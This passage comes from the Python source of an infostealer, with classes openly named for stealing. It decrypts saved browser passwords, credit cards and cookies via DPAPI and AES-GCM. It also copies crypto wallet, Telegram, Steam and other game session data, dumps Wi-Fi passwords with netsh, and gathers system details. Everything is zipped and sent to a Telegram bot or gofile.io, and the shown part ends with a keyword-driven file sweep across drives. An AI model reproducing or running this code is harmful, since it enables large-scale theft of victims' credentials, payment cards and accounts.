                ctypes.byref(pDataIn), None, ctypes.byref(pOptionalEntropy) if pOptionalEntropy else None,
                None, None, 0, ctypes.byref(pDataOut)
            ):
                data = (ctypes.c_ubyte * pDataOut.cbData)()
                ctypes.memmove(data, pDataOut.pbData, pDataOut.cbData)
                ctypes.windll.Kernel32.LocalFree(pDataOut.pbData)
                return bytes(data)
            else:
                error = ctypes.get_last_error()
                logging.error(f"CryptUnprotectData failed with Windows error code {error}")
                raise ctypes.WinError(error)
        except Exception as e:
            logging.error(f"DPAPI decryption error for data {encrypted_data[:10].hex()}...: {e}")
            raise

    @staticmethod
    def GetKey(FilePath: str = None) -> bytes:
        key_file = os.path.join(os.getenv('TEMP'), 'chrome_appbound_key.txt')
        try:
            if not os.path.exists(key_file):
                logging.warning(f"Key file not found: {key_file}. Falling back to DPAPI decryption.")
                return b""  # Fallback to DPAPI if key file is missing
            with open(key_file, "r", encoding="utf-8") as file:
                hex_key = file.read().strip()
            try:
                key_bytes = bytes.fromhex(hex_key)
                if len(key_bytes) != 32:
                    logging.error(f"Invalid AES key length: {len(key_bytes)} bytes (expected 32)")
                    raise ValueError(f"Invalid AES key length: {len(key_bytes)} bytes")
                logging.info(f"Successfully read AES key from {key_file}")
                return key_bytes
            except ValueError as e:
                logging.error(f"Invalid hex key in {key_file}: {e}")
                raise ValueError(f"Invalid hex key format: {hex_key}")
        except Exception as e:
            logging.error(f"Failed to read key from {key_file}: {e}")
            raise

    @staticmethod
    def Decrpytion(EncrypedValue: bytes, EncryptedKey: bytes, data_type: str = "unknown", browser: str = "unknown") -> str:
        try:
            if len(EncrypedValue) < 31:
                logging.warning(f"Encrypted {data_type} too short: {len(EncrypedValue)} bytes for {browser}")
                return "[Decryption Failed]"
            prefix = EncrypedValue[:3]
            if prefix in (b'v10', b'v11', b'v20'):
                if not EncryptedKey:
                    logging.warning(f"No AES key provided for {data_type} in {browser}. Trying DPAPI.")
                    try:
                        decrypted_bytes = SubModules.CryptUnprotectData(EncrypedValue)
                        return decrypted_bytes.decode('utf-8')
                    except Exception as e:
                        logging.error(f"DPAPI fallback failed for {data_type} in {browser}: {e}")
                        return "[Decryption Failed]"
                iv = EncrypedValue[3:15]
                payload = EncrypedValue[15:-16]
                authentication_tag = EncrypedValue[-16:]
                if not payload:
                    logging.warning(f"Empty payload for {data_type} in {browser}")
                    return "[Decryption Failed]"
                logging.info(f"Decrypting {prefix.decode('ascii')} {data_type} for {browser}")
                cipher = Cipher(algorithms.AES(EncryptedKey), modes.GCM(iv, authentication_tag), backend=default_backend())
                decryptor = cipher.decryptor()
                decrypted_bytes = decryptor.update(payload) + decryptor.finalize()
                try:
                    result = decrypted_bytes.decode('utf-8')
                    logging.info(f"Successfully decrypted {prefix.decode('ascii')} {data_type} for {browser}")
                    return result
                except UnicodeDecodeError as e:
                    logging.warning(f"UTF-8 decode failed for {data_type} in {browser}: {e}")
                    return "[Decryption Failed]"
            else:
                logging.info(f"Attempting DPAPI decryption for {data_type} in {browser}")
                decrypted_bytes = SubModules.CryptUnprotectData(EncrypedValue)
                try:
                    return decrypted_bytes.decode('utf-8')
                except UnicodeDecodeError as e:
                    logging.warning(f"UTF-8 decode failed for DPAPI {data_type} in {browser}: {e}")
                    return "[Decryption Failed]"
        except InvalidTag as e:
            logging.error(f"AES-GCM decryption failed for {data_type} in {browser}: Invalid authentication tag")
            return "[Decryption Failed]"
        except Exception as e:
            logging.error(f"Decryption failed for {data_type} in {browser}: {e}")
            return "[Decryption Failed]"

class StealSystemInformation:
    async def FunctionRunner(self) -> None:
        try:
            tasks = [
                asyncio.create_task(self.StealSystemInformation()),
                asyncio.create_task(self.StealWifiInformation()),
                asyncio.create_task(self.StealProcessInformation()),
                asyncio.create_task(self.StealNetworkInformation()),
            ]
            await asyncio.gather(*tasks)
        except Exception as e:
            logging.error(f"Error in StealSystemInformation.FunctionRunner: {e}")

    async def GetDefaultSystemEncoding(self) -> str:
        try:
            cmd = "cmd.exe /c chcp"
            process = await asyncio.create_subprocess_shell(cmd, stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE, shell=True)
            stdout, stderr = await process.communicate()
            return stdout.decode(errors="ignore").split(":")[1].strip()
        except Exception as e:
            logging.error(f"Error getting system encoding: {e}")
            return "utf-8"

    async def StealSystemInformation(self) -> None:
        try:
            current_code_page = await self.GetDefaultSystemEncoding()
            cmd = r'echo System Info & systeminfo & echo Tasklist & tasklist /svc & echo Ipconfig & ipconfig/all & echo Route Table & route print & echo Firewallinfo & netsh firewall show state & netsh firewall show config'
            result = await asyncio.create_subprocess_shell(cmd, stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE, shell=True)
            stdout, stderr = await result.communicate()
            Variables.SystemInfo.append(stdout.decode(current_code_page, errors="ignore"))
            logging.info("Collected system information")
        except Exception as e:
            logging.error(f"Error stealing system information: {e}")

    async def StealProcessInformation(self) -> None:
        try:
            process = await asyncio.create_subprocess_shell(
                "tasklist /FO LIST",
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE,
                shell=True
            )
            stdout, stderr = await process.communicate()
            Variables.Processes.append(stdout.decode(errors="ignore"))
            logging.info("Collected process information")
        except Exception as e:
            logging.error(f"Error stealing process information: {e}")

    async def StealNetworkInformation(self) -> None:
        try:
            async with aiohttp.ClientSession() as session:
                async with session.get("http://ip-api.com/json") as response:
                    data = await response.json()
                    ip = data.get("query", "Unknown")
                    country = data.get("country", "Unknown")
                    city = data.get("city", "Unknown")
                    timezone = data.get("timezone", "Unknown")
                    isp_info = f"{data.get('isp', '')} {data.get('org', '')} {data.get('as', '')}"
                    Variables.Network.append((ip, country, city, timezone, isp_info))
                    logging.info("Collected network information")
        except Exception as e:
            logging.error(f"Error stealing network information: {e}")

    async def StealWifiInformation(self) -> None:
        try:
            current_code_page = await self.GetDefaultSystemEncoding()
            process = await asyncio.create_subprocess_shell(
                "netsh wlan show profiles",
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE,
                shell=True
            )
            stdout, stderr = await process.communicate()
            decoded_profiles = stdout.decode(current_code_page, errors="ignore")
            wifi_profile_names = re.findall(r'All User Profile\s*: (.*)', decoded_profiles)
            for profile_name in wifi_profile_names:
                result = await asyncio.create_subprocess_shell(
                    f'netsh wlan show profile name="{profile_name}" key=clear',
                    stdout=asyncio.subprocess.PIPE,
                    shell=True
                )
                stdout, _ = await result.communicate()
                profile_output = stdout.decode(current_code_page, errors="ignore")
                wifi_passwords = re.search(r'Key content\s*: (.*)', profile_output, re.IGNORECASE)
                Variables.Wifis.append((profile_name, wifi_passwords.group(1) if wifi_passwords else "No password found"))
            logging.info(f"Collected {len(wifi_profile_names)} WiFi profiles")
        except Exception as e:
            logging.error(f"Error stealing WiFi information: {e}")

class Main:
    def __init__(self) -> None:
        self.profiles_full_path = []
        self.RoamingAppData = os.getenv('APPDATA')
        self.LocalAppData = os.getenv('LOCALAPPDATA')
        self.Temp = tempfile.mkdtemp()  # Use unique temporary directory
        self.FireFox = False
        self.FirefoxFilesFullPath = []
        self.FirefoxCookieList = []
        self.FirefoxHistoryList = []
        self.FirefoxAutofiList = []

    async def FunctionRunner(self):
        self.list_profiles()
        self.ListFirefoxProfiles()
        tasks = [
            asyncio.create_task(self.GetPasswords()),
            asyncio.create_task(self.GetCards()),
            asyncio.create_task(self.GetCookies()),
            asyncio.create_task(self.GetFirefoxCookies()),
            asyncio.create_task(self.GetHistory()),
            asyncio.create_task(self.GetFirefoxHistorys()),
            asyncio.create_task(self.GetDownload()),
            asyncio.create_task(self.GetBookMark()),
            asyncio.create_task(self.GetAutoFill()),
            asyncio.create_task(self.GetFirefoxAutoFills()),
            asyncio.create_task(StealSystemInformation().FunctionRunner())
        ]
        await asyncio.gather(*tasks)
        await self.WriteToText()
        await self.SendAllData()

    def list_profiles(self) -> None:
        directorys = {
            'Google Chrome': os.path.join(self.LocalAppData, "Google", "Chrome", "User Data"),
            'Opera': os.path.join(self.RoamingAppData, "Opera Software", "Opera Stable"),
            'Opera GX': os.path.join(self.RoamingAppData, "Opera Software", "Opera GX Stable"),
            'Brave': os.path.join(self.LocalAppData, "BraveSoftware", "Brave-Browser", "User Data"),
            'Edge': os.path.join(self.LocalAppData, "Microsoft", "Edge", "User Data"),
            'Vivaldi': os.path.join(self.LocalAppData, "Vivaldi", "User Data"),
            'Yandex': os.path.join(self.LocalAppData, "Yandex", "YandexBrowser", "User Data"),
            'Chromium': os.path.join(self.LocalAppData, "Chromium", "User Data"),
            'Firefox': os.path.join(self.RoamingAppData, "Mozilla", "Firefox", "Profiles"),
            # Add other browsers as in original code
        }
        for browser, directory in directorys.items():
            if os.path.isdir(directory):
                if "Opera" in directory:
                    self.profiles_full_path.append(directory)
                else:
                    for root, folders, _ in os.walk(directory):
                        for folder in folders:
                            folder_path = os.path.join(root, folder)
                            if folder == 'Default' or folder.startswith('Profile') or "Guest Profile" in folder:
                                self.profiles_full_path.append(folder_path)

    def ListFirefoxProfiles(self) -> None:
        try:
            directory = os.path.join(self.RoamingAppData, "Mozilla", "Firefox", "Profiles")
            if os.path.isdir(directory):
                for root, _, files in os.walk(directory):
                    for file in files:
                        file_path = os.path.join(root, file)
                        if file.endswith(("cookies.sqlite", "places.sqlite", "formhistory.sqlite")):
                            self.FirefoxFilesFullPath.append(file_path)
        except Exception as e:
            logging.error(f"Error listing Firefox profiles: {e}")

    async def GetFirefoxCookies(self) -> None:
        try:
            for file in self.FirefoxFilesFullPath:
                if "cookie" in file:
                    with sqlite3.connect(file) as conn:
                        cursor = conn.cursor()
                        cursor.execute('SELECT host, name, path, value, expiry FROM moz_cookies')
                        cookies = cursor.fetchall()
                        for cookie in cookies:
                            self.FirefoxCookieList.append(f"{cookie[0]}\t{'FALSE' if cookie[4] == 0 else 'TRUE'}\t{cookie[2]}\t{'FALSE' if cookie[0].startswith('.') else 'TRUE'}\t{cookie[4]}\t{cookie[1]}\t{cookie[3]}\n")
            self.FireFox = True
            logging.info("Collected Firefox cookies")
        except Exception as e:
            logging.error(f"Error getting Firefox cookies: {e}")

    async def GetFirefoxHistorys(self) -> None:
        try:
            for file in self.FirefoxFilesFullPath:
                if "places" in file:
                    with sqlite3.connect(file) as conn:
                        cursor = conn.cursor()
                        cursor.execute('SELECT id, url, title, visit_count, last_visit_date FROM moz_places')
                        historys = cursor.fetchall()
                        for history in historys:
                            self.FirefoxHistoryList.append(f"ID: {history[0]}\nURL: {history[1]}\nTitle: {history[2]}\nVisit Count: {history[3]}\nLast Visit Time: {history[4]}\n====================================================================================\n")
            self.FireFox = True
            logging.info("Collected Firefox history")
        except Exception as e:
            logging.error(f"Error getting Firefox history: {e}")

    async def GetFirefoxAutoFills(self) -> None:
        try:
            for file in self.FirefoxFilesFullPath:
                if "formhistory" in file:
                    with sqlite3.connect(file) as conn:
                        cursor = conn.cursor()
                        cursor.execute("SELECT * FROM moz_formhistory")
                        autofills = cursor.fetchall()
                        for autofill in autofills:
                            self.FirefoxAutofiList.append(f"{autofill}\n")
            self.FireFox = True
            logging.info("Collected Firefox autofills")
        except Exception as e:
            logging.error(f"Error getting Firefox autofills: {e}")

    async def GetPasswords(self) -> None:
        try:
            for path in self.profiles_full_path:
                browser_name = "None"
                index = path.find("User Data")
                if index != -1:
                    user_data_part = path[:index + len("User Data")]
                if "Opera" in path:
                    user_data_part = path
                    browser_name = "Opera"
                else:
                    text = path.split("\\")
                    browser_name = f"{text[-4]} {text[-3]}" if len(text) >= 4 else "Unknown"
                try:
                    key = SubModules.GetKey(os.path.join(user_data_part, "Local State"))
                except:
                    key = b""
                login_data = os.path.join(path, "Login Data")
                if not os.path.exists(login_data):
                    continue
                temp_db = os.path.join(self.Temp, f"Logins_{os.urandom(4).hex()}.db")
                shutil.copyfile(login_data, temp_db)
                try:
                    with sqlite3.connect(temp_db) as conn:
                        cursor = conn.cursor()
                        cursor.execute('SELECT origin_url, username_value, password_value FROM logins')
                        logins = cursor.fetchall()
                        for login in logins:
                            if login[0] and login[1] and login[2]:
                                Variables.Passwords.append(f"URL: {login[0]}\nUsername: {login[1]}\nPassword: {SubModules.Decrpytion(login[2], key, 'password', browser_name)}\nBrowser: {browser_name}\n======================================================================\n")
                finally:
                    if os.path.exists(temp_db):
                        os.remove(temp_db)
                        logging.info(f"Removed temporary database: {temp_db}")
        except Exception as e:
            logging.error(f"Error getting passwords: {e}")

    async def GetCards(self) -> None:
        try:
            for path in self.profiles_full_path:
                index = path.find("User Data")
                if index != -1:
                    user_data_part = path[:index + len("User Data")]
                if "Opera" in path:
                    user_data_part = path
                try:
                    key = SubModules.GetKey(os.path.join(user_data_part, "Local State"))
                except:
                    key = b""
                web_data = os.path.join(path, "Web Data")
                if not os.path.exists(web_data):
                    continue
                temp_db = os.path.join(self.Temp, f"Web_{os.urandom(4).hex()}.db")
                shutil.copyfile(web_data, temp_db)
                try:
                    with sqlite3.connect(temp_db) as conn:
                        cursor = conn.cursor()
                        cursor.execute('SELECT card_number_encrypted, expiration_year, expiration_month, name_on_card FROM credit_cards')
                        cards = cursor.fetchall()
                        for card in cards:
                            month = f"0{card[2]}" if card[2] < 10 else str(card[2])
                            Variables.Cards.append(f"{SubModules.Decrpytion(card[0], key, 'card', 'Unknown')}\t{month}/{card[1]}\t{card[3]}\n")
                finally:
                    if os.path.exists(temp_db):
                        os.remove(temp_db)
                        logging.info(f"Removed temporary database: {temp_db}")
        except Exception as e:
            logging.error(f"Error getting cards: {e}")

    async def GetCookies(self) -> None:
        try:
            for path in self.profiles_full_path:
                browser_name = "None"
                index = path.find("User Data")
                if index != -1:
                    user_data_part = path[:index + len("User Data")]
                if "Opera" in path:
                    user_data_part = path
                    browser_name = "Opera"
                else:
                    text = path.split("\\")
                    browser_name = f"{text[-4]} {text[-3]}" if len(text) >= 4 else "Unknown"
                try:
                    key = SubModules.GetKey(os.path.join(user_data_part, "Local State"))
                except:
                    key = b""
                cookie_data = os.path.join(path, "Network", "Cookies")
                if not os.path.exists(cookie_data):
                    continue
                temp_db = os.path.join(self.Temp, f"Cookies_{os.urandom(4).hex()}.db")
                shutil.copyfile(cookie_data, temp_db)
                try:
                    with sqlite3.connect(temp_db) as conn:
                        cursor = conn.cursor()
                        cursor.execute('SELECT host_key, name, path, encrypted_value, expires_utc FROM cookies')
                        cookies = cursor.fetchall()
                        for cookie in cookies:
                            dec_cookie = SubModules.Decrpytion(cookie[3], key, 'cookie', browser_name)
                            Variables.Cookies.append(f"{cookie[0]}\t{'FALSE' if cookie[4] == 0 else 'TRUE'}\t{cookie[2]}\t{'FALSE' if cookie[0].startswith('.') else 'TRUE'}\t{cookie[4]}\t{cookie[1]}\t{dec_cookie}\n")
                finally:
                    if os.path.exists(temp_db):
                        os.remove(temp_db)
                        logging.info(f"Removed temporary database: {temp_db}")
        except Exception as e:
            logging.error(f"Error getting cookies: {e}")

    async def GetWallets(self, copied_path: str) -> None:
        try:
            wallets_ext_names = {
                "MetaMask": "nkbihfbeogaeaoehlefnkodbefgpgknn",
                # Other wallet extensions as in original code
            }
            wallet_local_paths = {
                "Bitcoin": os.path.join(self.RoamingAppData, "Bitcoin", "wallets"),
                # Other wallet paths as in original code
            }
            os.makedirs(os.path.join(copied_path, "Wallets"), exist_ok=True)
            for path in self.profiles_full_path:
                ext_path = os.path.join(path, "Local Extension Settings")
                if os.path.exists(ext_path):
                    for wallet_name, wallet_addr in wallets_ext_names.items():
                        wallet_dir = os.path.join(ext_path, wallet_addr)
                        if os.path.isdir(wallet_dir):
                            try:
                                splited = wallet_dir.split("\\")
                                file_name = f"{splited[5]} {splited[6]} {splited[8]} {wallet_name}"
                                dest_dir = os.path.join(copied_path, "Wallets", file_name)
                                shutil.copytree(wallet_dir, dest_dir, dirs_exist_ok=True)
                                logging.info(f"Copied wallet {wallet_name} to {dest_dir}")
                            except Exception as e:
                                logging.error(f"Error copying wallet {wallet_name}: {e}")
            for wallet_name, wallet_path in wallet_local_paths.items():
                if os.path.exists(wallet_path):
                    try:
                        dest_dir = os.path.join(copied_path, "Wallets", wallet_name)
                        shutil.copytree(wallet_path, dest_dir, dirs_exist_ok=True)
                        logging.info(f"Copied wallet {wallet_name} to {dest_dir}")
                    except Exception as e:
                        logging.error(f"Error copying wallet {wallet_name}: {e}")
        except Exception as e:
            logging.error(f"Error getting wallets: {e}")

    async def GetHistory(self) -> None:
        try:
            for path in self.profiles_full_path:
                history_data = os.path.join(path, "History")
                if not os.path.exists(history_data):
                    continue
                temp_db = os.path.join(self.Temp, f"History_{os.urandom(4).hex()}.db")
                shutil.copyfile(history_data, temp_db)
                try:
                    with sqlite3.connect(temp_db) as conn:
                        cursor = conn.cursor()
                        cursor.execute('SELECT id, url, title, visit_count, last_visit_time FROM urls')
                        historys = cursor.fetchall()
                        for history in historys:
                            Variables.Historys.append(f"ID: {history[0]}\nURL: {history[1]}\nTitle: {history[2]}\nVisit Count: {history[3]}\nLast Visit Time: {history[4]}\n====================================================================================\n")
                finally:
                    if os.path.exists(temp_db):
                        os.remove(temp_db)
                        logging.info(f"Removed temporary database: {temp_db}")
        except Exception as e:
            logging.error(f"Error getting history: {e}")

    async def GetAutoFill(self) -> None:
        try:
            for path in self.profiles_full_path:
                autofill_data = os.path.join(path, "Web Data")
                if not os.path.exists(autofill_data):
                    continue
                temp_db = os.path.join(self.Temp, f"Autofill_{os.urandom(4).hex()}.db")
                shutil.copyfile(autofill_data, temp_db)
                try:
                    with sqlite3.connect(temp_db) as conn:
                        cursor = conn.cursor()
                        cursor.execute('SELECT * FROM autofill')
                        autofills = cursor.fetchall()
                        for autofill in autofills:
                            if autofill:
                                Variables.Autofills.append(f"{autofill}\n")
                finally:
                    if os.path.exists(temp_db):
                        os.remove(temp_db)
                        logging.info(f"Removed temporary database: {temp_db}")
        except Exception as e:
            logging.error(f"Error getting autofills: {e}")

    async def GetBookMark(self) -> None:
        try:
            for path in self.profiles_full_path:
                bookmark_data = os.path.join(path, "Bookmarks")
                if os.path.isfile(bookmark_data):
                    with open(bookmark_data, "r", encoding="utf-8", errors="ignore") as file:
                        data = json.load(file)
                    bookmarks = data.get("roots", {}).get("bookmark_bar", {}).get("children", [])
                    for bookmark in bookmarks:
                        Variables.Bookmarks.append(f"Browser Path: {path}\nID: {bookmark.get('id', '')}\nName: {bookmark.get('name', '')}\nURL: {bookmark.get('url', '')}\nGUID: {bookmark.get('guid', '')}\nAdded At: {bookmark.get('date_added', '')}\n\n=========================================================\n")
        except Exception as e:
            logging.error(f"Error getting bookmarks: {e}")

    async def GetDownload(self) -> None:
        try:
            for path in self.profiles_full_path:
                download_data = os.path.join(path, "History")
                if not os.path.exists(download_data):
                    continue
                temp_db = os.path.join(self.Temp, f"Download_{os.urandom(4).hex()}.db")
                shutil.copyfile(download_data, temp_db)
                try:
                    with sqlite3.connect(temp_db) as conn:
                        cursor = conn.cursor()
                        cursor.execute('SELECT tab_url, target_path FROM downloads')
                        downloads = cursor.fetchall()
                        for download in downloads:
                            Variables.Downloads.append(f"Downloaded URL: {download[0]}\nDownloaded Path: {download[1]}\n\n")
                finally:
                    if os.path.exists(temp_db):
                        os.remove(temp_db)
                        logging.info(f"Removed temporary database: {temp_db}")
        except Exception as e:
            logging.error(f"Error getting downloads: {e}")

    async def StealUplay(self, uuid: str) -> None:
        try:
            ubisoft_path = os.path.join(self.LocalAppData, "Ubisoft Game Launcher")
            copied_path = os.path.join(self.Temp, uuid, "Games", "Uplay")
            if os.path.isdir(ubisoft_path):
                os.makedirs(copied_path, exist_ok=True)
                for file in os.listdir(ubisoft_path):
                    src = os.path.join(ubisoft_path, file)
                    dst = os.path.join(copied_path, file)
                    try:
                        shutil.copy(src, dst)
                        logging.info(f"Copied Uplay file: {file}")
                    except Exception as e:
                        logging.error(f"Error copying Uplay file {file}: {e}")
        except Exception as e:
            logging.error(f"Error stealing Uplay data: {e}")

    async def StealEpicGames(self, uuid: str) -> None:
        try:
            epic_path = os.path.join(self.LocalAppData, "EpicGamesLauncher", "Saved", "Config", "Windows")
            copied_path = os.path.join(self.Temp, uuid, "Games", "Epic Games")
            if os.path.isdir(epic_path):
                shutil.copytree(epic_path, os.path.join(copied_path, "Windows"), dirs_exist_ok=True)
                logging.info("Copied Epic Games data")
        except Exception as e:
            logging.error(f"Error stealing Epic Games data: {e}")

    async def StealGrowtopia(self, uuid: str) -> None:
        try:
            growtopia_path = os.path.join(self.LocalAppData, "Growtopia", "save.dat")
            copied_path = os.path.join(self.Temp, uuid, "Games", "Growtopia")
            if os.path.isfile(growtopia_path):
                os.makedirs(copied_path, exist_ok=True)
                shutil.copy(growtopia_path, os.path.join(copied_path, "save.dat"))
                logging.info("Copied Growtopia data")
        except Exception as e:
            logging.error(f"Error stealing Growtopia data: {e}")

    async def StealTelegramSession(self, directory_path: str) -> None:
        try:
            tg_path = os.path.join(self.RoamingAppData, "Telegram Desktop", "tdata")
            if os.path.exists(tg_path):
                copy_path = os.path.join(directory_path, "Telegram Session")
                os.makedirs(copy_path, exist_ok=True)
                black_listed_dirs = [
                    "dumps", "emojis", "user_data", "working", "emoji",
                    "tdummy", "user_data#2", "user_data#3", "user_data#4", "user_data#5"
                ]
                for item in os.listdir(tg_path):
                    if item in black_listed_dirs:
                        continue
                    src = os.path.join(tg_path, item)
                    dst = os.path.join(copy_path, item)
                    try:
                        if os.path.isfile(src):
                            shutil.copyfile(src, dst)
                        elif os.path.isdir(src):
                            shutil.copytree(src, dst, dirs_exist_ok=True)
                        logging.info(f"Copied Telegram item: {item}")
                    except Exception as e:
                        logging.error(f"Error copying Telegram item {item}: {e}")
        except Exception as e:
            logging.error(f"Error stealing Telegram session: {e}")

    async def StealSteamSessionFiles(self, uuid: str) -> None:
        try:
            steam_path = os.path.join("C:\\", "Program Files (x86)", "Steam", "config")
            to_path = os.path.join(self.Temp, uuid, "Games", "Steam", "Session Files")
            if os.path.isdir(steam_path):
                shutil.copytree(steam_path, to_path, dirs_exist_ok=True)
                with open(os.path.join(self.Temp, uuid, "Games", "Steam", "How to Use.txt"), "w", encoding="utf-8", errors="ignore") as file:
                    file.write("")
                logging.info("Copied Steam session files")
        except Exception as e:
            logging.error(f"Error stealing Steam session files: {e}")

    async def WriteToText(self) -> None:
        try:
            cmd = "wmic csproduct get uuid"
            process = await asyncio.create_subprocess_shell(
                cmd,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE,
                shell=True
            )
            stdout, stderr = await process.communicate()
            output_lines = stdout.decode(errors="ignore").split("\n")
            uuid = output_lines[1].strip() if len(output_lines) > 1 else ''.join(random.choices(string.ascii_letters + string.digits, k=16))
            file_path = os.path.join(self.Temp, uuid)
            if os.path.isdir(file_path):
                shutil.rmtree(file_path, ignore_errors=True)
            os.makedirs(file_path)
            for dir_name in ["Browsers", "Sessions", "Tokens", "Games"]:
                os.makedirs(os.path.join(file_path, dir_name), exist_ok=True)
            await self.GetWallets(file_path)
            await self.StealTelegramSession(file_path)
            await self.StealUplay(uuid)
            await self.StealEpicGames(uuid)
            await self.StealGrowtopia(uuid)
            await self.StealSteamSessionFiles(uuid)
            if os.path.exists(os.path.join(file_path, "Games")) and not os.listdir(os.path.join(file_path, "Games")):
                shutil.rmtree(os.path.join(file_path, "Games"), ignore_errors=True)
            if self.FireFox:
                os.makedirs(os.path.join(file_path, "Browsers", "Firefox"), exist_ok=True)
            file_paths = {
                "process_info.txt": Variables.Processes,
                "last_clipboard.txt": Variables.ClipBoard,
                os.path.join("Browsers", "Firefox", "Cookies.txt"): self.FirefoxCookieList,
                os.path.join("Browsers", "Firefox", "History.txt"): self.FirefoxHistoryList,
                os.path.join("Browsers", "Firefox", "Autofills.txt"): self.FirefoxAutofiList,
                os.path.join("Browsers", "Passwords.txt"): Variables.Passwords,
                os.path.join("Browsers", "Cards.txt"): Variables.Cards,
                os.path.join("Browsers", "Cookies.txt"): Variables.Cookies,
                os.path.join("Browsers", "Historys.txt"): Variables.Historys,
                os.path.join("Browsers", "Autofills.txt"): Variables.Autofills,
                os.path.join("Browsers", "Bookmarks.txt"): Variables.Bookmarks,
                os.path.join("Browsers", "Downloads.txt"): Variables.Downloads,
                os.path.join("Sessions", "steam_sessions.txt"): Variables.SteamAccounts,
                os.path.join("Tokens", "discord_accounts.txt"): Variables.DiscordAccounts,
                os.path.join("Tokens", "full_tokens.txt"): Variables.FullTokens,
                os.path.join("Tokens", "validated_tokens.txt"): Variables.ValidatedTokens,
                "wifi_info.txt": [(f"WiFi Profile: {p}\nPassword: {pw}\n\n") for p, pw in Variables.Wifis] if Variables.Wifis else [],
                "system_info.txt": [str(info) for info in Variables.SystemInfo] if Variables.SystemInfo else [],
                "network_info.txt": [(f"{ip}\n{country}\n{city}\n{timezone}\n{isp}\n") for ip, country, city, timezone, isp in Variables.Network] if Variables.Network else []
            }
            for rel_path, data in file_paths.items():
                if data:
                    full_path = os.path.join(file_path, rel_path)
                    os.makedirs(os.path.dirname(full_path), exist_ok=True)
                    with open(full_path, "a", encoding="utf-8", errors="ignore") as f:
                        for item in data:
                            f.write(str(item))
            for dir_name in ["Sessions", "Tokens", "Browsers"]:
                dir_path = os.path.join(file_path, dir_name)
                if os.path.exists(dir_path) and not os.listdir(dir_path):
                    shutil.rmtree(dir_path, ignore_errors=True)
        except Exception as e:
            logging.error(f"Error writing to text: {e}")

    async def SendAllData(self) -> None:
        max_retries = 3
        retry_delay = 4
        try:
            file_path = self.Temp
            if not os.path.exists(file_path):
                raise FileNotFoundError(f"Temporary directory {file_path} does not exist")
            zip_path = os.path.join(os.getenv('TEMP'), f"data_{os.urandom(4).hex()}.zip")
            with zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED) as zipf:
                for root, _, files in os.walk(file_path):
                    for file in files:
                        file_full_path = os.path.join(root, file)
                        try:
                            arcname = os.path.relpath(file_full_path, file_path)
                            zipf.write(file_full_path, arcname)
                            logging.info(f"Added {file_full_path} to zip")
                        except Exception as e:
                            logging.error(f"Error adding {file_full_path} to zip: {e}")
            if not os.path.exists(zip_path):
                raise FileNotFoundError(f"Failed to create zip file at {zip_path}")
            async with aiohttp.ClientSession(connector=aiohttp.TCPConnector(ssl=False)) as session:
                for attempt in range(max_retries):
                    try:
                        async with session.post(webhook_message, json={"chat_id": chat_id, "text": "Preparing to send data..."}) as response:
                            if response.status == 200:
                                logging.info("Sent initial message to Telegram")
                                break
                            raise aiohttp.ClientResponseError(response.status, message="Failed to send initial message")
                    except Exception as e:
                        logging.error(f"Attempt {attempt + 1}/{max_retries} failed to send initial message: {e}")
                        if attempt < max_retries - 1:
                            await asyncio.sleep(retry_delay * (2 ** attempt))
                        else:
                            raise
                file_size_mb = os.path.getsize(zip_path) / (1024 * 1024)
                if file_size_mb > 49:
                    logging.info(f"File size {file_size_mb:.2f}MB exceeds Telegram limit, uploading to GoFile")
                    download_url = await UploadGoFile.upload_file(zip_path)
                    if download_url:
                        async with session.post(webhook_message, json={"chat_id": chat_id, "text": f"Data uploaded to: {download_url}"}) as response:
                            if response.status == 200:
                                logging.info(f"Sent GoFile link to Telegram: {download_url}")
                            else:
                                logging.error(f"Failed to send GoFile link: {response.status}")
                    else:
                        logging.error("GoFile upload failed")
                else:
                    for attempt in range(max_retries):
                        try:
                            with open(zip_path, 'rb') as file:
                                payload = aiohttp.FormData()
                                payload.add_field('chat_id', chat_id)
                                payload.add_field('document', file, filename=os.path.basename(zip_path))
                                async with session.post(webhook_document, data=payload) as response:
                                    if response.status == 200:
                                        logging.info(f"Sent file {zip_path} to Telegram")
                                        break
                                    raise aiohttp.ClientResponseError(response.status, message="Failed to send file")
                        except Exception as e:
                            logging.error(f"Attempt {attempt + 1}/{max_retries} failed to send file: {e}")
                            if attempt < max_retries - 1:
                                await asyncio.sleep(retry_delay * (2 ** attempt))
                            else:
                                raise
            os.remove(zip_path)
            shutil.rmtree(file_path, ignore_errors=True)
            logging.info(f"Cleaned up {zip_path} and {file_path}")
        except Exception as e:
            logging.error(f"Error in SendAllData: {e}")

class UploadGoFile:
    @staticmethod
    async def upload_file(file_path: str) -> str:
        try:
            upload_url = "https://store1.gofile.io/contents/uploadfile"
            async with aiohttp.ClientSession() as session:
                with open(file_path, 'rb') as f:
                    file_form = aiohttp.FormData()
                    file_form.add_field('file', f, filename=os.path.basename(file_path))
                    async with session.post(upload_url, data=file_form) as response:
                        output = await response.json()
                        download_page = output.get('data', {}).get('downloadPage')
                        if download_page:
                            logging.info(f"Uploaded file to GoFile: {download_page}")
                            return download_page
                        logging.error("No download page returned from GoFile")
                        return None
        except Exception as e:
            logging.error(f"Error uploading to GoFile: {e}")
            return None

class StealCommonFiles:
    def __init__(self) -> None:
        self.temp = os.getenv("TEMP")
        self.max_depth = 3  # Giới hạn độ sâu quét thư mục cho các ổ không phải C

    async def StealFiles(self) -> None:
        drives = self.get_all_drives()
        username = os.getenv("USERNAME")
        keywords = ["secret", "password", "account", "tax", "key", "wallet", "backup", "acc", "pass", "2fa", "backup"]
        allowed_extensions = [
            ".txt", ".doc", ".docx", ".png", ".pdf", ".jpg", ".jpeg", ".csv", ".mp4",
            ".xls", ".xlsx", ".zip", ".7z", ".psd", ".jfif", ".rar", ".bat", ".ps1", ".gif",
            ".html", ".js", ".ts", ".css", ".ppt", ".pptx", ".rtf", ".xml", ".json",
            ".log", ".ini", ".sql", ".db", ".sqlite", ".md", ".yml", ".yaml", ".conf", ".cfg",
            ".avi", ".mkv", ".mov", ".wmv", ".flv", ".m4a", ".wav", ".ogg", ".epub", ".mobi",
            ".azw3", ".lit", ".fb2", ".cbr", ".cbz", ".iso", ".dmg", ".tar", ".gz", ".bz2",
